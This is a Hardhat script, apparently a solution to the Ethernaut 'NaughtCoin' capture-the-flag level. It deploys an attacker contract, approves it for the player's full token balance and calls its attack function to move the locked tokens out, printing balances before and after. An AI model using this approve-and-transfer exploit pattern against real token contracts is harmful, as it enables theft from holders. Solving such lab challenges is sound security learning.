const {ethers} = require("hardhat");
const {getContractAddress} = require("@ethersproject/address");
const {BigNumber} = require("ethers");
require('dotenv').config()

async function main() {
  const [user] = await ethers.getSigners();
  const NaughtCoin = await ethers.getContractFactory("NaughtCoin");
  const naught_coin = NaughtCoin.attach(process.env.NAUGHT_COIN_ADDR);
  console.log(`player: ${ await naught_coin.player() }`);
  console.log(`user: ${ user.address }`);

  const NaughtCoinHacker = await ethers.getContractFactory("NaughtCoinHacker");
  const naught_coin_hacker = await NaughtCoinHacker.deploy();
  await naught_coin_hacker.deployed();

  console.log(`user balance: ${await naught_coin.balanceOf(user.address)}`);
  console.log(`naught_coin_hacker balance: ${await naught_coin.balanceOf(naught_coin_hacker.address)}`);
  const balance = await naught_coin.balanceOf(user.address);
  let tx = await naught_coin.approve(naught_coin_hacker.address, balance);
  await tx.wait();
  tx = await naught_coin_hacker.attack(naught_coin.address);
  await tx.wait();
  console.log(`user balance: ${await naught_coin.balanceOf(user.address)}`);
  console.log(`naught_coin_hacker balance: ${await naught_coin.balanceOf(naught_coin_hacker.address)}`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
